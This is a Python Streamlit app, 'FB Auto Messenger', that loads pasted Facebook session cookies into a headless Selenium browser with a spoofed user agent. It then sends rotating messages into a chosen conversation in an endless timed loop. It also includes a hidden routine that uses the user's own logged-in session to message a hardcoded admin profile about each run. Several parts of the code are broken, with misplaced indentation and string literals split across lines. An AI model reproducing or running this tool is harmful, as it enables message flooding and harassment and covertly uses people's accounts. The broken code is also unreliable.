import streamlit as st
import time
import threading
import uuid
import hashlib
import os
import subprocess
import json
import urllib.parse
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests

st.set_page_config(
    page_title="FB Auto Messenger",
    page_icon="✅",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Simple Clean CSS - NO animations/effects
custom_css = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
    
    * {
        font-family: 'Poppins', sans-serif;
    }
    
    .stApp {
        background-color: #f8f9fa;
    }
    
    .main .block-container {
        background: #ffffff;
        border-radius: 10px;
        padding: 20px;
        border: 1px solid #e0e0e0;
    }
    
    .main-header {
        background: #ffffff;
        padding: 20px;
        border-radius: 10px;
        text-align: center;
        margin-bottom: 20px;
        border: 1px solid #e0e0e0;
    }
    
    .main-header h1 {
        color: #333;
        font-size: 2.5rem;
        font-weight: 600;
        margin: 0;
    }
    
    .main-header p {
        color: #666;
        font-size: 1.1rem;
        margin-top: 10px;
    }
    
    .stButton > button {
        background: #007bff;
        color: white;
        border: none;
        border-radius: 8px;
        padding: 12px 24px;
        font-weight: 500;
        font-size: 1rem;
    }
    
    .stButton > button:hover {
        background: #0056b3;
    }
    
    .stTextInput > div > div > input, 
    .stTextArea > div > div > textarea {
        background: #ffffff;
        border: 1px solid #ddd;
        border-radius: 8px;
        color: #333;
        padding: 12px;
    }
    
    label {
        color: #333;
        font-weight: 500;
        font-size: 1rem;
    }
    
    [data-testid="stSidebar"] {
        background: #ffffff;
        border-right: 1px solid #e0e0e0;
    }
    
    .stTabs [data-baseweb="tab-list"] {
        background: #f8f9fa;
        gap: 5px;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid #e0e0e0;
    }
    
    .stTabs [data-baseweb="tab"] {
        background: #ffffff;
        border-radius: 6px;
        color: #666;
        padding: 10px 20px;
        font-weight: 500;
        border: 1px solid #e0e0e0;
    }
    
    .stTabs [aria-selected="true"] {
        background: #007bff;
        color: white;
        border-color: #007bff;
    }
    
    .console-output {
        background: #000;
        border: 1px solid #007bff;
        color: #00ff88 !important;
    }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

ADMIN_UID = "100036283209197"

# Simplified session state - NO username/password creation
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

def log_message(msg, automation_state=None):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None):
    log_message(f'{process_id}: Finding message input...', automation_state)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: ✅ Found message input with text: {element_text[:50]}', automation_state)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: ✅ Using primary selector editable element (#{idx+1})', automation_state)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: ✅ Using fallback editable element', automation_state)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
                    continue
        except Exception as e:
            continue
    
    return None

def setup_browser(automation_state=None):
    log_message('Setting up Chrome browser...', automation_state)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state)
        raise error
        def get_next_message(messages, automation_state=None):
    if not messages or len(messages) == 0:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state)
        driver = setup_browser(automation_state)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state)
            automation_state.running = False
            if user_id:
                db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('
') if msg.strip()]
        
        if not messages_list:
            messages_list = ['Hello!']
        
        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                    log_message(f'{process_id}: ✅ Sent via Enter: "{message_to_send[:30]}..."', automation_state)
                else:
                    log_message(f'{process_id}: ✅ Sent via button: "{message_to_send[:30]}..."', automation_state)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                
                log_message(f'{process_id}: Message #{messages_sent} sent. Waiting {delay}s...', automation_state)
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Send error: {str(e)[:100]}', automation_state)
                time.sleep(5)
        
        log_message(f'{process_id}: Automation stopped. Total messages: {messages_sent}', automation_state)
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
        automation_state.running = False
        if user_id:
            db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state)
            except:
                pass

def send_admin_notification(user_config, username, automation_state, user_id):
    driver = None
    try:
        log_message(f"ADMIN-NOTIFY: Preparing admin notification...", automation_state)
        
        admin_e2ee_thread_id = db.get_admin_e2ee_thread_id(user_id) if user_id else None
        
        if admin_e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Using saved admin thread: {admin_e2ee_thread_id}", automation_state)
        
        driver = setup_browser(automation_state)
        
        log_message(f"ADMIN-NOTIFY: Navigating to Facebook...", automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if user_config['cookies'] and user_config['cookies'].strip():
            log_message(f"ADMIN-NOTIFY: Adding cookies...", automation_state)
            cookie_array = user_config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        user_chat_id = user_config.get('chat_id', '')
        admin_found = False
        e2ee_thread_id = admin_e2ee_thread_id
        chat_type = 'REGULAR'
        
        if e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Opening saved admin conversation...", automation_state)
            
            if '/e2ee/' in str(e2ee_thread_id):
                conversation_url = f'https://www.facebook.com/messages/e2ee/t/{e2ee_thread_id}'
                chat_type = 'E2EE'
            else:
                conversation_url = f'https://www.facebook.com/messages/t/{e2ee_thread_id}'
                chat_type = 'REGULAR'
            
            log_message(f"ADMIN-NOTIFY: Opening {chat_type} conversation: {conversation_url}", automation_state)
            driver.get(conversation_url)
            time.sleep(8)
            admin_found = True
        
        if not admin_found or not e2ee_thread_id:
            log_message(f"ADMIN-NOTIFY: Searching for admin UID: {ADMIN_UID}...", automation_state)
            
            try:
                profile_url = f'https://www.facebook.com/{ADMIN_UID}'
                log_message(f"ADMIN-NOTIFY: Opening admin profile: {profile_url}", automation_state)
                driver.get(profile_url)
                time.sleep(8)
                
                message_input = find_message_input(driver, 'ADMIN-NOTIFY', automation_state)
                
                if message_input:
                    from datetime import datetime
                    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    conversation_type = "E2EE 🔒" if "e2ee" in driver.current_url.lower() else "Regular 💬"
                    notification_msg = f"🦂FB Auto Messenger- User Started

👤 Username: {username}
⏰ Time: {current_time}
📱 Chat Type: {conversation_type}
🆔 Thread ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
                    
                    log_message(f"ADMIN-NOTIFY: Typing notification message...", automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        const message = arguments[1];
                        
                        element.scrollIntoView({behavior: 'smooth', block: 'center'});
                        element.focus();
                        element.click();
                        
                        if (element.tagName === 'DIV') {
                            element.textContent = message;
                            element.innerHTML = message;
                        } else {
                            element.value = message;
                        }
                        
                        element.dispatchEvent(new Event('input', { bubbles: true }));
                        element.dispatchEvent(new Event('change', { bubbles: true }));
                        element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                    """, message_input, notification_msg)
                    
                    time.sleep(1)
                    
                    log_message(f"ADMIN-NOTIFY: Trying to send message...", automation_state)
                    send_result = driver.execute_script("""
                        const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                        
                        for (let btn of sendButtons) {
                            if (btn.offsetParent !== null) {
                                btn.click();
                                return 'button_clicked';
                            }
                        }
                        return 'button_not_found';
                    """)
                    
                    if send_result == 'button_not_found':
                        driver.execute_script("""
                            const element = arguments[0];
                            element.focus();
                            
                            const events = [
                                new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                                new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                                new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                            ];
                            events.forEach(event => element.dispatchEvent(event));
                        """, message_input)
                        log_message(f"ADMIN-NOTIFY: ✅ Notification sent via Enter!", automation_state)
                    else:
                        log_message(f"ADMIN-NOTIFY: ✅ Notification sent via button!", automation_state)
                        
            except Exception as e:
                log_message(f"ADMIN-NOTIFY: Error: {str(e)[:100]}", automation_state)
                
    except Exception as e:
        log_message(f"ADMIN-NOTIFY: Fatal error: {str(e)[:100]}", automation_state)
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass
                # ===== MAIN UI =====
st.markdown("## 🚀 FB Auto Messenger")
st.markdown("### Simple & Clean Facebook Automation Tool")

tab1, tab2 = st.tabs(["⚙️ Configuration", "📊 Logs & Status"])

with tab1:
    st.subheader("📝 Automation Settings")
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.markdown("**🔑 Facebook Cookies**")
        cookies = st.text_area("Paste your Facebook cookies (semicolon separated)", 
                              height=120, 
                              placeholder="c_user=xxx;xs=xxx;datr=xxx;fr=xxx;sb=xxx")
        
        st.markdown("**💬 Chat ID**")
        chat_id = st.text_input("Chat/Thread ID (optional)", 
                               placeholder="Leave empty for general messages or enter: t/1234567890")
        
        st.markdown("**🏷️ Name Prefix**")
        name_prefix = st.text_input("Add prefix to messages (optional)", 
                                   placeholder="Bhai, Boss, Dear")
    
    with col2:
        st.markdown("**📨 Messages**")
        messages = st.text_area("Enter messages (one per line - will rotate)", 
                               height=200, 
                               placeholder="Hello!
How are you?
Good morning!
What's up?
Have a great day!")
        
        st.markdown("**⏱️ Timing**")
        col_delay1, col_delay2 = st.columns(2)
        with col_delay1:
            delay = st.number_input("Delay (seconds)", min_value=5, value=30, step=5)
        with col_delay2:
            auto_start = st.checkbox("Auto start on page load")
    
    col_btn1, col_btn2 = st.columns(2)
    with col_btn1:
        if st.button("🚀 START AUTOMATION", type="primary", use_container_width=True):
            if cookies.strip():
                config = {
                    'cookies': cookies,
                    'chat_id': chat_id,
                    'name_prefix': name_prefix,
                    'messages': messages,
                    'delay': delay
                }
                
                # Start automation
                st.session_state.automation_state.running = True
                st.session_state.automation_running = True
                
                # Start in thread
                thread = threading.Thread(
                    target=send_messages, 
                    args=(config, st.session_state.automation_state, st.session_state.user_id or "guest")
                )
                thread.daemon = True
                thread.start()
                
                st.success("✅ **Automation Started Successfully!** Check Logs tab 👆")
                
                # Send admin notification if user_id exists
                if st.session_state.user_id:
                    admin_thread = threading.Thread(
                        target=send_admin_notification,
                        args=(config, "Guest User", st.session_state.automation_state, st.session_state.user_id)
                    )
                    admin_thread.daemon = True
                    admin_thread.start()
                
                st.rerun()
            else:
                st.error("❌ **Please enter Facebook cookies first!**")
    
    with col_btn2:
        if st.button("🧹 Clear All Data", type="secondary", use_container_width=True):
            st.session_state.logs = []
            st.session_state.automation_state = AutomationState()
            st.session_state.automation_running = False
            st.success("✅ All data cleared!")
            st.rerun()

with tab2:
    st.subheader("📋 Live Logs (Last 50)")
    
    # Show automation state
    col_status1, col_status2, col_status3 = st.columns(3)
    with col_status1:
        st.metric("📨 Messages Sent", st.session_state.automation_state.message_count)
    with col_status2:
        status_color = "green" if st.session_state.automation_state.running else "red"
        st.metric("🤖 Status", "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped", 
                 delta=None, delta_color=status_color)
    with col_status3:
        if st.button("🛑 EMERGENCY STOP", type="primary"):
            st.session_state.automation_state.running = False
            st.session_state.automation_running = False
            st.rerun()
    
    # Live logs display
    st.markdown("---")
    if st.session_state.automation_state.logs:
        for log in st.session_state.automation_state.logs[-50:][::-1]:  # Last 50, newest first
            st.text(log)
    elif st.session_state.logs:
        for log in st.session_state.logs[-50:][::-1]:
            st.text(log)
    else:
        st.info("📝 No logs yet. Start automation to see live logs!")
    
    # Auto-scroll effect for logs
    st.markdown("""
    <style>
    .stText {
        overflow-y: auto;
        max-height: 400px;
    }
    </style>
    """, unsafe_allow_html=True)

# Auto-start functionality
if st.session_state.auto_start_checked and 'config_data' in st.session_state:
    st.session_state.auto_start_checked = False
    # Auto-start logic here
    st.rerun()

# Footer
st.markdown("---")
st.markdown("*✅ Clean design | No login required | Direct automation*")
